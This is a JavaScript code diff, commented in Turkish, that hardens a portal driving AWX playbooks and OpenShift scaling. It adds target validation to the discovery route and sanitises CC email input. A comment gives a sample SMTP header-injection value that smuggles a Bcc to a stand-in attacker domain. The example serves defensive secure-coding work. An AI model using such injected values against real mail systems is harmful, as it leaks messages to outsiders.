@@ -69,6 +69,52 @@ function buildScaleXClusterCatalog({ env, tenant, clusters, hosts, meta }) {
   return { version: 1, defaults: { tls_verify: false }, clusters: out };
 }
 
+// KESIF de kullanici girdisini playbook'a tasir — DOGRULAMA ORTAK OLMALI.
+//
+// `/discover` uzun sure `assertValidTargets`i cagirmiyordu: yalnizca `/preview` ve
+// `/run` doguluyordu. Oysa kesif de `target_namespace` / `target_app_names` degerlerini
+// AWX uzerinden playbook'a, oradan `oc` komut satirina tasiyor. Yetki katmani bu bosluga
+// engel DEGIL: kisitlama satiri yoksa varsayilan-ACIK gecer. Yani portalin tek savunma
+// hatti buydu ve kesif yolunda YOKTU.
+//
+// Kesifte `apps` OPSIYONEL (namespace'i tarayip listeyi ogrenmek icin cagriliyor) —
+// tek fark bu; format kurallari BIREBIR ayni ve tek yerden geliyor.
+function assertValidDiscoveryTargets({ namespace, apps = [] }) {
+  const bad = (msg) => { throw Object.assign(new Error(msg), { status: 400 }); };
+  if (!namespace || namespace.length > 63 || !NS_RE.test(namespace)) bad(`Geçersiz namespace: ${namespace}`);
+  for (const a of apps) {
+    if (!a || a.length > 253 || !APP_RE.test(a)) bad(`Geçersiz uygulama adı: ${a}`);
+  }
+}
+
+// CC adresleri kullanicidan gelir ve playbook'un mail gorevine ulasir. `.trim()` yalnizca
+// BASTAKI/SONDAKI boslugu siler — gomulu `\r\n` aynen kalirdi ve bu, klasik SMTP BASLIK
+// ENJEKSIYONU demek ("a@x.com\r\nBcc: disari@saldirgan.com"). `mail_to` guvende cunku
+// oturumdan geliyor; acik yalnizca CC'deydi.
+//
+// Kurallar: satir sonu/kontrol karakteri KESIN yasak, adres formati zorunlu, en fazla
+// 10 adres ve 320 karakter/adres (RFC 5321 sinirlari).
+const MAIL_RE = /^[^\s@,;:<>"\\]+@[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?\.[A-Za-z]{2,}$/;
+const MAX_CC = 10;
+
+function sanitizeMailCc(raw) {
+  const value = String(raw ?? '').trim();
+  if (!value) return '';
+  const bad = (msg) => { throw Object.assign(new Error(msg), { status: 400 }); };
+  // Kontrol karakterlerini adres ayristirmasindan ONCE reddet: virgulle bolup her parcayi
+  // ayri dogrulamak, `\r\n` tasiyan bir parcayi format hatasi olarak zaten yakalardi —
+  // ama hatayi ACIKCA soylemek, kullanicinin kopyala-yapistir sirasinda ne oldugunu
+  // anlamasini sagliyor.
+  if (/[\r\n\t\0]/.test(value)) bad('CC adresinde satır sonu veya kontrol karakteri olamaz.');
+  const parts = value.split(/[,;]/).map((x) => x.trim()).filter(Boolean);
+  if (!parts.length) bad('CC adresi okunamadı.');
+  if (parts.length > MAX_CC) bad(`En fazla ${MAX_CC} CC adresi verilebilir (${parts.length} girildi).`);
+  for (const a of parts) {
+    if (a.length > 320 || !MAIL_RE.test(a)) bad(`Geçersiz CC adresi: ${a}`);
+  }
+  return parts.join(',');
+}
+
 function assertValidTargets({ namespace, apps, action, targetReplicas, executionMode, verificationTimeout }) {
   const bad = (msg) => { throw Object.assign(new Error(msg), { status: 400 }); };
   if (!ACTIONS.includes(action)) bad(`Geçersiz işlem: ${action}`);
@@ -184,5 +230,6 @@ function buildGateVars({ env, tenant, action, executionMode, clusters, namespace
 module.exports = {
   ACTIONS, MODES, VERIFICATION_TIMEOUTS, MAX_TARGETS, PROD_WRITTEN_CONFIRM_THRESHOLD,
   isProdEnv, computeBlastRadius, isHpaPinAllowed, buildScaleXClusterCatalog, assertValidTargets,
+  assertValidDiscoveryTargets, sanitizeMailCc,
   buildRunExtraVars, gatePolicyFor, buildGateVars, gates,
 };
